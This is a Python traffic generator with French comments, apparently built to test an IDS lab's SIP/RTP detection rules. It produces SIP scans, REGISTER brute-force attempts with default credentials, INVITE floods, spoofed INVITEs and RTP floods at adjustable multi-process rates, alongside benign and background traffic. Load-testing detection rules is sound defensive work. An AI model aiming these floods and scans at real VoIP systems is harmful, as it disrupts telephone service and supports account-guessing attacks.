#!/usr/bin/env python3
"""attack_gen.py - generateur de trafic parametrable (a lancer sur Kali).

Reprend les 5 attaques de la plateforme Flask (memes messages SIP/RTP) mais :
  * debit reglable (--pps ou --mult par rapport aux debits d'origine),
  * plusieurs processus pour les debits eleves (--workers),
  * trafic de fond non detecte par les regles (--bg-pps) pour tester la montee en charge,
  * profils de trafic legitime "difficiles" (benign_register, benign_options),
  * lancement automatisable par SSH (utilise par run_batch.sh).

Debits d'origine (plateforme Flask, bornes hautes) :
  sip_scan 10 pps | sip_brute 20 | sip_flood 100 | sip_spoof 20 | rtp_flood 200

Exemples :
  python3 attack_gen.py --mode sip_flood --duration 60
  python3 attack_gen.py --mode sip_flood --duration 60 --bg-pps 5000 --bg-lead 5
  python3 attack_gen.py --mode sip_scan --duration 60 --pps 0.3        # sous le seuil -> faux negatif attendu
  python3 attack_gen.py --mode benign_register --phones 20 --period 10 --duration 60
"""
import argparse
import json
import math
import multiprocessing as mp
import random
import socket
import string
import sys
import time

BASE_PPS = {"sip_scan": 10.0, "sip_brute": 20.0, "sip_flood": 100.0, "sip_spoof": 20.0, "rtp_flood": 200.0}
ATTACKS = list(BASE_PPS)
OTHERS = ["background", "benign_register", "benign_options"]
USERS = ["admin", "user", "test", "1000", "2000", "9999"]
PASSWORDS = ["1234", "password", "admin", "test", "", "sip123"]


def rs(rnd, n=8):
    return "".join(rnd.choices(string.ascii_lowercase + string.digits, k=n))


def m_sip_scan(rnd, t):
    return (f"OPTIONS sip:{t} SIP/2.0\r\nVia: SIP/2.0/UDP {rs(rnd)};branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:scanner@{rs(rnd)}>\r\nTo: <sip:{t}>\r\nCall-ID: {rs(rnd)}\r\n"
            f"CSeq: 1 OPTIONS\r\nMax-Forwards: 70\r\n\r\n").encode()


def m_sip_brute(rnd, t):
    u, p = rnd.choice(USERS), rnd.choice(PASSWORDS)
    auth = (f'Authorization: Digest username="{u}", realm="asterisk", nonce="{rs(rnd)}", '
            f'uri="sip:{t}", response="{rs(rnd)}"\r\n')
    return (f"REGISTER sip:{t} SIP/2.0\r\nVia: SIP/2.0/UDP {rs(rnd)};branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:{u}@{t}>\r\nTo: <sip:{u}@{t}>\r\nCall-ID: {rs(rnd)}\r\nCSeq: 1 REGISTER\r\n"
            f"Contact: <sip:{u}@{rs(rnd)}>\r\n{auth}\r\nContent-Length: 0\r\n\r\n").encode()


def m_sip_flood(rnd, t):
    return (f"INVITE sip:target@{t} SIP/2.0\r\nVia: SIP/2.0/UDP {rs(rnd)};branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:flood@{rs(rnd)}>\r\nTo: <sip:target@{t}>\r\nCall-ID: {rs(rnd)}\r\n"
            f"CSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n").encode()


def m_sip_spoof(rnd, t):
    ip = ".".join(str(rnd.randint(1, 254)) for _ in range(4))
    return (f"INVITE sip:spoofed@{t} SIP/2.0\r\nVia: SIP/2.0/UDP {ip};branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:fake@{ip}>\r\nTo: <sip:spoofed@{t}>\r\nCall-ID: {rs(rnd)}\r\n"
            f"CSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n").encode()


def m_rtp(rnd, t):
    return b"A" * 160


def m_background(rnd, t):  # NOTIFY : ne correspond a aucune des 5 regles, mais est inspecte (port 5060)
    body = rs(rnd, 120)
    return (f"NOTIFY sip:bg@{t} SIP/2.0\r\nVia: SIP/2.0/UDP 10.9.9.9;branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:bg@10.9.9.9>\r\nTo: <sip:bg@{t}>\r\nCall-ID: {rs(rnd)}\r\nCSeq: 1 NOTIFY\r\n"
            f"Event: presence\r\nContent-Length: {len(body)}\r\n\r\n{body}").encode()


def m_benign_register(rnd, t):
    u = str(1000 + rnd.randint(0, 99))
    return (f"REGISTER sip:{t} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.{rnd.randint(2, 250)};branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:{u}@{t}>;tag={rs(rnd, 6)}\r\nTo: <sip:{u}@{t}>\r\nCall-ID: {rs(rnd)}\r\n"
            f"CSeq: 1 REGISTER\r\nContact: <sip:{u}@10.0.0.{rnd.randint(2, 250)}>\r\nExpires: 3600\r\n"
            f"Content-Length: 0\r\n\r\n").encode()


def m_benign_options(rnd, t):
    return (f"OPTIONS sip:{t} SIP/2.0\r\nVia: SIP/2.0/UDP 10.0.0.{rnd.randint(2, 250)};branch=z9hG4bK{rs(rnd)}\r\n"
            f"From: <sip:{1000 + rnd.randint(0, 99)}@{t}>;tag={rs(rnd, 6)}\r\nTo: <sip:{t}>\r\n"
            f"Call-ID: {rs(rnd)}\r\nCSeq: 1 OPTIONS\r\nUser-Agent: DeskPhone/1.0\r\nContent-Length: 0\r\n\r\n").encode()


BUILDERS = {
    "sip_scan": (m_sip_scan, 5060), "sip_brute": (m_sip_brute, 5060), "sip_flood": (m_sip_flood, 5060),
    "sip_spoof": (m_sip_spoof, 5060), "rtp_flood": (m_rtp, None), "background": (m_background, 5060),
    "benign_register": (m_benign_register, 5060), "benign_options": (m_benign_options, 5060),
}


def worker(kind, pps, duration, target, rtp_port, seed, q, bind_ip=None):
    build, port = BUILDERS[kind]
    port = port or rtp_port
    rnd = random.Random(seed)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if bind_ip:
        sock.bind((bind_ip, 0))
    interval = 1.0 / pps
    t0 = time.perf_counter()
    end, next_t, sent = t0 + duration, t0, 0
    while True:
        now = time.perf_counter()
        if now >= end:
            break
        if now < next_t:
            time.sleep(min(next_t - now, 0.002))
            continue
        try:
            sock.sendto(build(rnd, target), (target, port))
            sent += 1
        except OSError:
            pass
        next_t += interval
        if next_t < now - 0.2:  # on ne rattrape pas un retard important
            next_t = now
    sock.close()
    q.put((kind, sent))


def spawn(kind, pps, duration, target, rtp_port, workers, q, seed0, bind_ip=None):
    procs = []
    per = pps / workers
    for i in range(workers):
        p = mp.Process(target=worker, args=(kind, per, duration, target, rtp_port, seed0 + i, q, bind_ip))
        p.start()
        procs.append(p)
    return procs


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="192.168.56.1")
    ap.add_argument("--mode", required=True, choices=ATTACKS + OTHERS)
    ap.add_argument("--duration", type=float, default=60.0)
    ap.add_argument("--pps", type=float, default=None, help="debit en paquets/s (defaut : debit d'origine x mult)")
    ap.add_argument("--mult", type=float, default=1.0, help="multiplicateur du debit d'origine")
    ap.add_argument("--workers", type=int, default=0, help="processus (defaut : 1 par 5000 pps)")
    ap.add_argument("--phones", type=int, default=20, help="benign_* : nombre de telephones")
    ap.add_argument("--period", type=float, default=60.0, help="benign_* : periode (s) entre deux messages d'un telephone")
    ap.add_argument("--bg-pps", type=float, default=0.0, help="trafic de fond NOTIFY (pps) en parallele")
    ap.add_argument("--bg-lead", type=float, default=5.0, help="secondes de trafic de fond avant le debut de l'attaque")
    ap.add_argument("--bg-src", default=None, help="adresse IP source du trafic de fond (alias IP de Kali)")
    ap.add_argument("--rtp-port", type=int, default=10000)
    ap.add_argument("--log", default=None, help="fichier JSON-lines de synthese (optionnel)")
    a = ap.parse_args()

    if a.pps is not None:
        pps = a.pps
    elif a.mode in ATTACKS:
        pps = BASE_PPS[a.mode] * a.mult
    elif a.mode in ("benign_register", "benign_options"):
        pps = a.phones / a.period
    else:
        ap.error("--pps requis pour --mode background")
    if pps <= 0:
        ap.error("pps doit etre > 0")
    workers = a.workers or max(1, math.ceil(pps / 5000.0))
    seed0 = int(time.time()) & 0xFFFF
    q = mp.Queue()
    procs = []

    t_launch = time.time()
    if a.bg_pps > 0:
        bg_workers = max(1, math.ceil(a.bg_pps / 5000.0))
        procs += spawn("background", a.bg_pps, a.bg_lead + a.duration + 1.0, a.target, a.rtp_port, bg_workers, q, seed0 + 500, a.bg_src)
        time.sleep(a.bg_lead)
    t_attack = time.time()
    procs += spawn(a.mode, pps, a.duration, a.target, a.rtp_port, workers, q, seed0)
    for p in procs:
        p.join()
    t_end = time.time()

    counts = {}
    while not q.empty():
        k, n = q.get()
        counts[k] = counts.get(k, 0) + n
    summary = {"mode": a.mode, "target": a.target, "pps_requested": pps, "workers": workers,
               "bg_pps_requested": a.bg_pps, "launch_epoch": t_launch, "attack_start_epoch": t_attack,
               "end_epoch": t_end, "packets_sent": counts}
    line = json.dumps(summary)
    print(line)
    if a.log:
        with open(a.log, "a") as f:
            f.write(line + "\n")


if __name__ == "__main__":
    main()
